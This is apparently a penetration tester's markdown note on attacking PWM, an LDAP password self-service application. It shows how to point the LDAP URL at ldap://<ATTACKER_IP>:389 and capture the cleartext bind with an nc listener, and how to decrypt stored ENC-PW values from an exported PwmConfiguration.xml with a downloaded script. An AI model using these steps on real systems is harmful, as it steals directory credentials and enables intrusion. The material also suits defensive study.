---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: "PWM"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Theory*

> ***An open source password self-service application for LDAP directories.***

##### *Modes*

###### *Open Configuration*

This *PWM* mode allows to gather some interesting information without any prior authentication required

![[PWM-20260607151501099.webp|300]]

> ***Zoom in***

However, authentication is still required to carry any action that involves change or modify configured parameters within the control panel

![[PWM-20260607151804732.webp|250]]

> ***Zoom in***

---

#### *Forcing LDAP Connection to retrieve Plain Credentials*

Once we obtain valid credentials to authenticate ourselves against the *PWM* control panel, we can look for any configured *LDAP* connection, as it usually contains *LDAP* credentials

> ***Configuration Editor → LDAP → LDAP Directories → <DIRECTORY\> → Connection***

![[PWM-20260607152354451.webp|300]]

> ***Zoom in***

However, we cannot extract the *LDAP* plain password from the connection section, as it's stored encrypted within the *PwmConfiguration.xml* file

![[PWM-20260607152758817.webp|250]]

> ***Zoom in***

> [!BUG]- *PwmConfiguration.xml*
>
> ```bash
> <SNIP>
> <value>ENC-PW:SbynUzwVEFXBLHfFwVwcL0...<SNIP>...TYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPI8=</value>
> <SNIP>
> ```
>

But we can replace the existing *LDAP URL* with the below

```bash
ldap://<ATTACKER_IP>:389
```

Doing so, when we click on the *Test LDAP Profile* button, the application will perform an *LDAP* bind against our server, as we replace *ldaps* with *ldap*, the data will be transmitted with no encryption, so we can grab the plain credentials

It's not necessary to set up an *LDAP Server*, we can handle the incoming *LDAP* authentication by setting up a *TCP listener* on *port 389* as follows

```bash
nc -lnvp 389
```

---

#### *Decrypting stored LDAP Credentials*

Another way to extract *LDAP* credentials in plain text from *PWM* would be by decrypting stored credentials within the *PwmConfigurationFile.xml*

If we have valid credentials to authenticate against the *PWM* control panel, we can export this configuration file from the *PWM Configuration Manager*

![[PWM-20260607155301027.webp|300]]

> ***Zoom in***

Once we have download it, it's as simple as follows

##### *Downloading a PWM Decryption Utility*

> ***[PWM_decrypt.py](https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2)***

```bash
curl --silent --location --request GET --remote-name 'https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2/raw/4a3d27c311a684f41729caa4f56728fbb924243e/pwm_decrypt.py'
```

##### *Replacing data within the utility*

The tool in question does not have a parameter parser, so we must replace the following information with the appropiate values

- ***Key***

***Parameter***

```bash
key = "<VALUE>StoredConfiguration"
```

***Value***

> ***CreateTime's value***

```bash
...<SNIP>...<PwmConfiguration createTime="2022-08-11T01:46:23Z"...<SNIP>...
```

- ***Encrypted Text***

***Parameter***

```bash
encrypted_text = "<VALUE>"
```

***Value***

> ***Base64 String w/o `ENC-PW`***

```bash
<value>ENC-PW:SbynUzwVEFXBLHfFwVwcL0wdJhqOB0oaXb3QkEXCvJ3LyHo6pJ0q327iwGi0WW51TYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=</value>
```

##### *Decrypting the data*

###### *Setup*

```bash
mkdir PWMDecrypt
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install pycryptodome
```

###### *Usage*

```bash
python3 pwm_decrypt.py
```

> [!NOTE]- *Command Output*
>
> ```bash
> Decrypted text: {"salt":"<SALT>","value":"<PLAIN_PASSWD>"}
> ```
>

---

#### *Resources*

***[PWM](https://github.com/pwm-project/pwm)***

***[PWM Decrypt](https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2)***